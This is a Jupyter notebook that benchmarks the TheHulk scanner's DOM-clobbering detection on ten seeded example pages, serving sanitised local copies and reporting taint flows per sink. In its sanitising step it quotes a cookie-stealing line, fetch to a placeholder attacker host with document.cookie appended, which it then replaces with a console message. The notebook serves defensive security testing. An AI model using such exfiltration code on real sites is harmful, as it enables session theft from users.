# Multi-gadget DOM-clobbering benchmark for TheHulk

This notebook runs TheHulk's generic `dom-clobbering-site-scan` task on the ten example pages in `data/multi-gadget-chains`. The notebook locates that dataset from the workspace root; it is stored here under `TheHulk/tasks/` so the benchmark notebook stays outside the data directory.

It creates temporary test copies, checks that each marked clobbering payload appears before the page's first executable script, redirects placeholder attacker hosts to loopback, and replaces alert/cookie-transfer demonstrations with harmless console messages. The source examples remain unchanged.

Start TheHulk's proxy in another WSL terminal before running the scan cell. The Playwright runner needs Node.js 14 or newer; this notebook selects one from `~/.local/bin`, `~/.nvm`, or `PATH` and uses it for subprocesses.

Interpret results carefully: these examples contain known payload markup. A flow in round 00 tests whether Hulk observes the seeded flow; it does not show that the generic task discovered that payload. The task's generated candidates remain anchor-oriented and cannot yet synthesize every form/image/attribute combination in the dataset.

In [24]:
from pathlib import Path
import json, os, re, socket, subprocess, tempfile, threading, time
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from functools import partial

# Find the workspace and dataset even if Jupyter starts in TheHulk/ or its tasks/ directory.
cwd = Path.cwd().resolve()
candidates = [cwd, *cwd.parents]
WORKSPACE = next((p for p in candidates if (p / "TheHulk/tasks/dom-clobbering-site-scan/scan.sh").is_file()), None)
if WORKSPACE is None:
    repo = next((p for p in candidates if p.name == "TheHulk" and (p / "tasks/dom-clobbering-site-scan/scan.sh").is_file()), None)
    if repo is None:
        raise RuntimeError("Could not locate TheHulk/tasks/dom-clobbering-site-scan/scan.sh")
    WORKSPACE = repo.parent
REPO = WORKSPACE / "TheHulk"
SCAN = REPO / "tasks/dom-clobbering-site-scan/scan.sh"
DATASET_CANDIDATES = [WORKSPACE / "data/multi-gadget-chains", WORKSPACE / "data/multi-gadget-chains/multi-gadget-chains"]
DATASET = next((p for p in DATASET_CANDIDATES if len(list(p.glob("chain_*.html"))) > 0), None)
if DATASET is None:
    raise FileNotFoundError("No chain_*.html examples found under workspace/data/multi-gadget-chains")

# Find Node >=14. Jupyter may have inherited an older WSL PATH than your shell.
node_candidates = [Path.home() / ".local/bin/node"]
node_candidates += sorted((Path.home() / ".nvm/versions/node").glob("*/bin/node"), reverse=True)
node_candidates += [Path(entry) / "node" for entry in os.environ.get("PATH", "").split(os.pathsep) if entry]
seen, compatible_node = set(), None
for candidate in node_candidates:
    candidate = candidate.expanduser()
    if str(candidate) in seen or not candidate.is_file():
        continue
    seen.add(str(candidate))
    try:
        version = subprocess.check_output([str(candidate), "--version"], text=True, stderr=subprocess.DEVNULL).strip()
        if int(re.match(r"v?(\d+)", version).group(1)) >= 14:
            compatible_node = candidate.resolve(), version
            break
    except (OSError, subprocess.CalledProcessError, AttributeError, ValueError):
        pass
if compatible_node is None:
    raise RuntimeError("Playwright requires Node.js 14+. Install/use a newer Node in WSL and restart Jupyter.")
NODE_BIN, NODE_VERSION = compatible_node
os.environ["PATH"] = str(NODE_BIN.parent) + os.pathsep + os.environ.get("PATH", "")
PROXY_PORT = 8899  # Change if your running TheHulk proxy uses another port.
MAX_ROUNDS = 2
print("Workspace:", WORKSPACE)
print("Dataset:", DATASET)
print("Examples:", len(list(DATASET.glob("chain_*.html"))))
print("Node:", NODE_VERSION, "at", NODE_BIN)
print("Proxy port:", PROXY_PORT)


Workspace: /home/ericx/hulkwork
Dataset: /home/ericx/hulkwork/data/multi-gadget-chains
Examples: 10
Node: v22.22.3 at /home/ericx/hermes-home/node/bin/node
Proxy port: 8899


In [25]:
def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]

SITE_PORT, SINK_PORT = free_port(), free_port()
while SINK_PORT == SITE_PORT:
    SINK_PORT = free_port()
SAFE_DIR = Path(tempfile.mkdtemp(prefix="hulk-domc-chains-"))

for source in sorted(DATASET.glob("chain_*.html")):
    html = source.read_text(encoding="utf-8")
    marker = re.search(r"<!--\s*={8,}\s*-->\s*<!--\s*CLOBBERING PAYLOAD\b[\s\S]*?-->", html, re.IGNORECASE)
    # Ignore script-like examples inside comments when validating actual execution order.
    uncommented = re.sub(r"<!--[\s\S]*?-->", lambda match: " " * len(match.group()), html)
    first_script = re.search(r"<script\b", uncommented, re.IGNORECASE)
    if not marker or not first_script:
        raise RuntimeError(f"{source.name}: couldn't locate the marked payload or an executable script")
    if marker.start() > first_script.start():
        raise RuntimeError(f"{source.name}: payload comes after app code; fix the fixture instead of reordering it in this benchmark")

    # Keep the sink assignments/branch checks, but avoid alert and data-transfer effects.
    html = html.replace("fetch('https://attack.hulk/x?c='+document.cookie)", "console.log('SAFE_CHAIN_10_REACHED')")
    html = html.replace("alert(document.domain)", "console.log('SAFE_CHAIN_08_REACHED')")
    html = html.replace("alert(1)", "console.log('SAFE_DOMC_HANDLER_REACHED')")
    # Preserve each scheme and make every placeholder attacker host loopback-only.
    html = html.replace("https://attack.hulk", f"https://127.0.0.1:{SINK_PORT}")
    html = html.replace("http://attack.hulk", f"http://127.0.0.1:{SINK_PORT}")
    html = html.replace("https://xxx.xxx.xxx", f"https://127.0.0.1:{SINK_PORT}")
    (SAFE_DIR / source.name).write_text(html, encoding="utf-8")

print("Prepared safe copies at:", SAFE_DIR)
print("Site server port:", SITE_PORT, "| local sink response port:", SINK_PORT)


Prepared safe copies at: /tmp/hulk-domc-chains-nqv6oqt8
Site server port: 46151 | local sink response port: 60893


In [26]:
class QuietHandler(SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

class NoopScriptHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        body = b"console.log('LOCAL_NOOP_SCRIPT_LOADED');\n"
        self.send_response(200)
        self.send_header("Content-Type", "application/javascript")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, fmt, *args):
        pass

site_server = ThreadingHTTPServer(("127.0.0.1", SITE_PORT), partial(QuietHandler, directory=str(SAFE_DIR)))
sink_server = ThreadingHTTPServer(("127.0.0.1", SINK_PORT), NoopScriptHandler)
for server in (site_server, sink_server):
    threading.Thread(target=server.serve_forever, daemon=True).start()
time.sleep(0.2)
print(f"Serving examples at http://127.0.0.1:{SITE_PORT}/")
print("Servers are loopback-only. Leave this notebook kernel alive during scans.")


Serving examples at http://127.0.0.1:46151/
Servers are loopback-only. Leave this notebook kernel alive during scans.


In [27]:
if not SCAN.is_file():
    raise FileNotFoundError(SCAN)
with socket.create_connection(("127.0.0.1", PROXY_PORT), timeout=2):
    pass
print(f"Proxy is listening on 127.0.0.1:{PROXY_PORT}.")


Proxy is listening on 127.0.0.1:8899.


In [28]:
results = []
for page in sorted(SAFE_DIR.glob("chain_*.html")):
    url = f"http://127.0.0.1:{SITE_PORT}/{page.name}"
    env = os.environ.copy()
    env["HULK_MAX_ROUNDS"] = str(MAX_ROUNDS)
    proc = subprocess.run([str(SCAN), url, str(PROXY_PORT)], cwd=REPO, env=env, text=True, capture_output=True)
    output = proc.stdout + "\n" + proc.stderr
    log_path = SAFE_DIR / (page.stem + ".scan.log")
    log_path.write_text(output, encoding="utf-8")
    if proc.returncode != 0:
        raise RuntimeError(f"{page.name} exited {proc.returncode}; full log: {log_path}\n" + output[-2500:])
    match = re.search(r"Scan output: (.+)", output)
    out_dir = Path(match.group(1).strip()) if match else None
    summary_file = out_dir / "discovery-summary.json" if out_dir else None
    summary = json.loads(summary_file.read_text()) if summary_file and summary_file.exists() else []
    flows = sum(row.get("taintFlowCount", 0) for row in summary)
    attributed = sum(len(row.get("flowsFromInjectedTargets", [])) for row in summary)
    sinks = []
    for row in summary:
        trace = Path(row["tracePath"])
        if trace.exists():
            sinks.extend(item.get("sinkReason") for item in json.loads(trace.read_text()) if item.get("sinkReason"))
    result = {"example": page.name, "flows_any_round": flows,
              "flows_from_task_targets": attributed, "sink_reasons": sorted(set(sinks)),
              "output": str(out_dir) if out_dir else "not found"}
    results.append(result)
    print(f"{page.name}: flows={flows}, task-target flows={attributed}, sinks={sorted(set(sinks))}")
    if proc.returncode != 0:
        print(output[-1500:])

print("\nA flow may come from the example's built-in payload. It is not proof that the generic scanner synthesized that payload.")


chain_01_amp_config_loader.html: flows=4, task-target flows=2, sinks=['SINK-TO-SCRIPT-SRC']
chain_02_webpack_hmr.html: flows=4, task-target flows=2, sinks=['SINK-TO-SCRIPT-SRC']
chain_03_polyfills_loader.html: flows=2, task-target flows=1, sinks=['SINK-TO-SCRIPT-SRC']
chain_04_settings_eval.html: flows=0, task-target flows=0, sinks=[]
chain_05_debug_config_innerhtml.html: flows=6, task-target flows=3, sinks=['SINK-TO-DOM-ELEMENT-INNERHTML']
chain_06_mathjax_root_extensions.html: flows=2, task-target flows=1, sinks=['SINK-TO-SCRIPT-SRC']
chain_07_umeditor_document_write.html: flows=2, task-target flows=1, sinks=['SINK-TO-DOCUMENT-WRITE']
chain_08_seajs_function_ctor.html: flows=2, task-target flows=1, sinks=['SINK-TO-FUNCTION']
chain_09_cusdis_insertadjacenthtml.html: flows=2, task-target flows=1, sinks=['SINK-TO-INSERTADJACENTHTML']
chain_10_analytics_inline_script.html: flows=2, task-target flows=1, sinks=['SINK-TO-SCRIPT-TEXT']

A flow may come from the example's built-in payload. It

## Interpreting results

- `flows_any_round` reports trace count across the task's rounds. These fixtures include known payload markup, now placed before the app script in temporary copies.
- `flows_from_task_targets` is the task's attribution to names it injected in later rounds. Since the original payload remains, inspect the trace to establish what caused the flow.
- This is a seeded-flow benchmark, not a proof of unsupervised chain discovery. The generic task currently generates anchor-oriented candidates and does not infer all DOM shapes or branch dependencies.
- Inspect each reported `taintflows.json`, `conditions.json`, and source inventory. Some sinks or chain patterns may not be covered by Hulk's runtime rules.

In [29]:
for server in (site_server, sink_server):
    server.shutdown()
    server.server_close()
print("Notebook-owned local servers stopped.")


Notebook-owned local servers stopped.
